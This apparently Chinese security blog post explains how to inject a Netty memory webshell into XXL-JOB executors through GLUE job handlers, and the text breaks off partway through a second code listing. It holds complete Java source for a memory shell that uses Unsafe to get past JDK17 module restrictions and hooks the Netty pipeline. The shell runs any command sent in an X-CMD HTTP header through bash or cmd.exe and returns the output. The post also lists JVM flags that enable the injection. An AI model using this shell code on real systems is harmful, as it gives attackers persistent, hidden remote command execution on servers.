<h5 id="JDK17模块化绕过探索"><a href="#JDK17模块化绕过探索" class="headerlink" title="JDK17模块化绕过探索"></a>JDK17模块化绕过探索</h5><p>为高版本<code>XXL-JOB</code>，内存马逻辑中使用了非常多的反射，需要绕模块化机制，正常来说只需要<code>patchModule</code>一下将恶意类的<code>module</code>改为<code>java.base</code>就可以绕过了</p>
<p>故魔改内存马加上<code>patchModule</code>的逻辑</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.service.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.http.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.timeout.IdleStateHandler;</span><br><span class="line"><span class="keyword">import</span> io.netty.util.CharsetUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// patchModule,绕JDK17</span></span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        Module ObjectModule=Object.class.getModule();</span><br><span class="line">        <span class="type">long</span> <span class="variable">address</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(DemoGlueJobHandler.class, address, ObjectModule);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">group</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threads</span> <span class="operator">=</span> group.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] allThreads = (Thread[]) threads.get(group);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : allThreads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;nioEventLoopGroup&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object target;</span><br><span class="line">                        target = getFieldValue(getFieldValue(getFieldValue(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;runnable&quot;</span>), <span class="string">&quot;val\$eventExecutor&quot;</span>);</span><br><span class="line">                        <span class="comment">// NioEventLoop</span></span><br><span class="line">                        <span class="keyword">if</span> (target.getClass().getName().endsWith(<span class="string">&quot;NioEventLoop&quot;</span>)) &#123;</span><br><span class="line">                            XxlJobHelper.log(<span class="string">&quot;NioEventLoop find&quot;</span>);</span><br><span class="line">                            <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> (HashSet) getFieldValue(getFieldValue(target, <span class="string">&quot;unwrappedSelector&quot;</span>), <span class="string">&quot;keys&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (!set.isEmpty()) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">keys</span> <span class="operator">=</span> set.toArray()[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// pipeline</span></span><br><span class="line">                                <span class="type">Object</span> <span class="variable">pipeline</span> <span class="operator">=</span> getFieldValue(getFieldValue(keys, <span class="string">&quot;attachment&quot;</span>), <span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 替换 handler</span></span><br><span class="line">                                <span class="type">Object</span> <span class="variable">aggregator</span> <span class="operator">=</span> getFieldValue(getFieldValue(getFieldValue(pipeline, <span class="string">&quot;head&quot;</span>), <span class="string">&quot;next&quot;</span>), <span class="string">&quot;handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 设置初始化</span></span><br><span class="line">                                setFieldValue(aggregator, <span class="string">&quot;childHandler&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                                    <span class="meta">@Override</span></span><br><span class="line">                                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel channel)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                        channel.pipeline()</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">IdleStateHandler</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span> * <span class="number">3</span>, TimeUnit.SECONDS))  <span class="comment">// beat 3N, close if idle</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpServerCodec</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpObjectAggregator</span>(<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>))  <span class="comment">// merge request &amp; reponse to FULL</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">NettyThreadHandler</span>());</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">                                XxlJobHelper.log(<span class="string">&quot;ok?&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                        XxlJobHelper.log(ignored.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            XxlJobHelper.log(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获得一个unsafe实例对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyThreadHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelDuplexHandler</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpRequest)msg;</span><br><span class="line">            <span class="keyword">if</span>(httpRequest.headers().contains(<span class="string">&quot;X-CMD&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpRequest.headers().get(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">execResult</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ArrayList&lt;String&gt; cmdList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    cmdList.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                    cmdList.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    cmdList.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                    cmdList.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                cmdList.add(cmd);</span><br><span class="line">                String[] cmds = cmdList.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds).start();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    execResult =execResult+line;</span><br><span class="line">                &#125;</span><br><span class="line">                process.destroy();</span><br><span class="line">                <span class="comment">// 返回执行结果</span></span><br><span class="line">                send(ctx, execResult, HttpResponseStatus.OK);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                ctx.fireChannelRead(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是依然抛出异常</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224174922-zefg8mw.png" alt="image"></p>
<p>在<code>java.lang.reflect.AccessibleObject#checkCanSetAccessible(java.lang.Class&lt;?&gt;, java.lang.Class&lt;?&gt;, boolean)</code>方法打断点找原因</p>
<p>可以看到<code>caller</code>不是<code>DemoGlueJobHandler</code>而是<code>org.codehaus.groovy.vmplugin.v8.IndyInterface$$InjectedInvoker/0x00000098016f0c00</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224175402-7fyyftx.png" alt="image"></p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>当直接添加虚拟机选项把模块化机制放开</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.invoke=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.util.concurrent=ALL-UNNAMED --add-opens java.base/java.util.stream=ALL-UNNAMED --add-opens java.base/java.io=ALL-UNNAMED --add-opens java.base/java.nio=ALL-UNNAMED --add-opens java.base/java.nio.channels=ALL-UNNAMED --add-opens java.base/java.nio.file=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens java.base/java.security=ALL-UNNAMED --add-opens java.base/java.math=ALL-UNNAMED --add-opens java.base/java.text=ALL-UNNAMED --add-opens java.base/java.time=ALL-UNNAMED --add-opens java.base/java.util.jar=ALL-UNNAMED --add-opens java.base/java.util.zip=ALL-UNNAMED --add-opens java.base/sun.nio.ch=ALL-UNNAMED --add-opens java.base/sun.security.util=ALL-UNNAMED --add-opens java.base/jdk.internal.misc=ALL-UNNAMED --add-opens java.base/jdk.internal.loader=ALL-UNNAMED --add-opens java.base/jdk.internal.ref=ALL-UNNAMED --add-opens java.base/jdk.internal.vm=ALL-UNNAMED</span><br></pre></td></tr></table></figure>

<p>就可以正常注入内存马了</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224162909-8jwaazy.png" alt="image"></p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="XXL-JOB-Netty-内存马"><a href="#XXL-JOB-Netty-内存马" class="headerlink" title="XXL-JOB &amp; Netty 内存马"></a>XXL-JOB &amp; Netty 内存马</h3><h4 id="执行器初始化流程分析"><a href="#执行器初始化流程分析" class="headerlink" title="执行器初始化流程分析"></a>执行器初始化流程分析</h4><p>以<code>XXL-JOB 2.3.1</code>为例</p>
<p>执行器初始化流程如图所示，最终调用至<code>EmbedServer#start</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223133443-maxzupv.png" alt="image"></p>
<p>在<code>EmbedServer#start</code>方法中，调用<code>bootstrap.bind(port)</code>绑定端口</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224095352-cwv4k6m.png" alt="image"></p>
<p>调用至<code>io.netty.bootstrap.ServerBootstrap#init</code>进行初始化</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224095609-4o1139x.png" alt="image"></p>
<p>在<code>pipeline</code>中加入<code>ServerBootstrapAcceptor</code>​</p>
<p>当我们在调度后台点击”执行任务”的时候</p>
<p>​<code>ServerBootstrapAcceptor</code>的作用是接收<code>accept</code>到的新连接，然后调用<code>ServerBootstrapAcceptor#channelRead</code>方法</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224102203-8w5b65d.png" alt="image"></p>
<p>​<code>ServerBootstrapAcceptor#channelRead</code>方法中会添加<code>childHandler</code>，并注册<code>EventLoopGroup</code>中</p>
<p>添加<code>childHandler</code>的操作就会走到<code>EmbedServer#start</code>方法中重写的<code>initChannel</code>方法</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224103111-8hqko1t.png" alt="image"></p>
<p>其中<code>EmbedHttpServerHandler</code>是负责处理<code>/run</code>等路由的逻辑的</p>
<p>调用至<code>com.xxl.job.core.server.EmbedServer.EmbedHttpServerHandler#channelRead0</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224103649-apqna22.png" alt="image"></p>
<p>处理请求的逻辑在<code>com.xxl.job.core.server.EmbedServer.EmbedHttpServerHandler#process</code>方法中，跟进，是很熟悉的处理逻辑了</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224103824-6xaqjni.png" alt="image"></p>
<p>‍</p>
<p>获取当前线程所属的线程组看细节，</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224105822-epo3nwi.png" alt="image"></p>
<p>这里<code>DefaultChannelPipeline</code>就是<code>ServerBootstrap#init</code>中的<code>pipeline</code>，<code>Netty</code>中<code>pipeline</code>是由多个<code>handler</code>构成的双向列表，这里的<code>head</code>是虚拟头节点，它的<code>next</code>指向第一个真实的<code>handler</code>，即<code>ServerBootstrapAcceptor</code>，和我们之前分析的<code>ServerBootstrap#init</code>完美契合</p>
<p>‍</p>
<p>一种注入内存马的思路是直接改<code>childHandler</code>，添加一个恶意的<code>handler</code>来处理<code>HTTP</code>请求</p>
<p>只需要一步一步把<code>handler</code>提取出来，然后给<code>childhandler</code>重新赋值即可</p>
<p>文章 <code>https://www.kitsch.life/2024/01/31/xxl-job%e5%88%a9%e7%94%a8%e7%a0%94%e7%a9%b6/</code> 给出了低版本<code>xxl-job</code>的<code>netty</code>内存马代码，但是还是老问题，从<code>xxl-job 2.3.0</code>开始，<code>execute()</code>方法改为无参，<code>XxlJobLogger.log</code>修改为<code>XxlJobHelper.log</code>​</p>
<p>修改后代码如下所示</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.http.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.timeout.IdleStateHandler;</span><br><span class="line"><span class="keyword">import</span> io.netty.util.CharsetUtil;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		XxlJobHelper.log(<span class="string">&quot;XXL-JOB, Hello World.&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">group</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threads</span> <span class="operator">=</span> group.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] allThreads = (Thread[]) threads.get(group);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : allThreads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;nioEventLoopGroup&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object target;</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            target = getFieldValue(getFieldValue(getFieldValue(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;runnable&quot;</span>), <span class="string">&quot;val\$eventExecutor&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                        <span class="comment">// NioEventLoop</span></span><br><span class="line">                        <span class="keyword">if</span> (target.getClass().getName().endsWith(<span class="string">&quot;NioEventLoop&quot;</span>)) &#123;</span><br><span class="line">                            XxlJobHelper.log(<span class="string">&quot;NioEventLoop find&quot;</span>);</span><br><span class="line">                            <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> (HashSet) getFieldValue(getFieldValue(target, <span class="string">&quot;unwrappedSelector&quot;</span>), <span class="string">&quot;keys&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (!set.isEmpty()) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">keys</span> <span class="operator">=</span> set.toArray()[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">                                <span class="comment">// pipeline</span></span><br><span class="line">                                <span class="type">Object</span> <span class="variable">pipeline</span> 